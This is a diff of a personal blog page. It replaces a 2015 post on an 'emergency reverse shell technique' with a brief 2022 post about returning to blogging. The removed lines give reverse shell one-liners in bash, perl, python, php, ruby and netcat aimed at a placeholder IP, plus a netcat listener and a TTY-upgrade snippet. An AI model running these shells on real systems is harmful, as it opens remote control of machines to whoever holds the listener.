@@ -28,78 +28,19 @@
         <div id="content">
             <div id="main-content">
                                             <div class="post">
-                <h2><a href="/blog/emergency-reverse-shell-technique.html">Emergency reverse shell technique</a></h2>
-                <h3>18 Jun 2015 08:44  | <a class="tag" href="/blog/tag/security.html">security</a></h3>
-                  <pre>Don&#39;t you just hate it when an emergency happens with an important server and
-access from your location is firewalled?  Luckily if there&#39;s someone else local
-to the machine who can execute commands for you, getting onto it is fairly
-trivial.
+                <h2><a href="/blog/getting-back-into-blogging.html">Getting back into blogging</a></h2>
+                <h3>10 Feb 2022 05:48  | <a class="tag" href="/blog/tag/security.html">security</a></h3>
+                  <pre>It&#39;s been a while since I&#39;ve blogged so I thought I&#39;d get back into it with some
+security stuff. My dayjob has had a very heavy security focus for the last 3
+years and it&#39;s infected my personal life too such that I&#39;m now even more
+obsessed with security than I was before.
 
-First make sure that the machine you&#39;re on can accept connections from the
-internet on a TCP port (any).  Typically you&#39;ll need to map this through on
-whatever firewall/router you&#39;ve got on the local network.
+I recently wrote a first draft of a Linux server hardening guide:
+<a href="https://github.com/m4rkw/linux-server-hardening-guide and plan to start a">https://github.com/m4rkw/linux-server-hardening-guide and plan to start a</a>
+mini-series soon which will go into some of those topics in further detail with
+example configs etc.
 
-Let&#39;s say your ip address is 127.127.127.127 and you&#39;ve mapped tcp port 13131.
-Simply listen on the port with netcat:
-
-$ nc -l 13131
-
-then have someone on the remote machine run any of these:
-
-bash:
-
-bash -i &gt;&amp; /dev/tcp/127.127.127.127/13131 0&gt;&amp;1
-
-perl:
-
-perl -e &#39;use
-Socket;$i=&quot;127.127.127.127&quot;;$p=13131;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash
--i&quot;);};&#39;
-
-python:
-
-python -c &#39;import
-socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.127.127.127&quot;,13131));os.dup2(s.fileno(),0);
-os.dup2(s.fileno(),1);
-os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#39;
-
-php:
-
-php -r &#39;$sock=fsockopen(&quot;127.127.127.127&quot;,13131);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3
-2&gt;&amp;3&quot;);&#39;
-
-ruby:
-
-ruby -rsocket -e&#39;f=TCPSocket.open(&quot;127.127.127.127&quot;,13131).to_i;exec
-sprintf(&quot;/bin/bash -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
-
-netcat:
-
-nc -e /bin/bash 127.127.127.127 13131
-
-and hey presto, your netcat listener is now connected to the shell. Of course
-the connection isn&#39;t encrypted, so you&#39;ll want to be careful what you type over
-it, but for emergency use it&#39;s quite handy. The advantage over the obvious
-choice for this (ssh) is that you don&#39;t have to give the person who&#39;s at the
-server end any credentials to log into your machine with in order to set up the
-connection.
-
-source: <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>
-
-&lt;strong&gt;Update&lt;/strong&gt;
-
-One limitation of this is that you won&#39;t have a tty, which makes many things
-impossile or difficult.
-
-However if expect is installed you can get one by dropping this into a file and
-running it:
-
-#!/usr/bin/expect
-# Spawn a shell, then allow the user to interact with it.  The new shell will
-# have a good enough TTY to run tools like ssh, su and login
-spawn bash interact
-
-then you have a full tty and can run sudo, su, screen etc :)</pre>
+Watch this space!</pre>
             </div>
 
 
@@ -112,7 +53,7 @@ then you have a full tty and can run sudo, su, screen etc :)</pre>
 
             <ul>
               <li>&nbsp;&nbsp;[year]</li>
-                <li>&nbsp;&nbsp;<a href="/blog/2022.html">2022</a></li>
+                <li>&gt; <a href="/blog/2022.html">2022</a> &lt;</li>
                 <li>&nbsp;&nbsp;<a href="/blog/2021.html">2021</a></li>
                 <li>&nbsp;&nbsp;<a href="/blog/2020.html">2020</a></li>
                 <li>&nbsp;&nbsp;<a href="/blog/2019.html">2019</a></li>
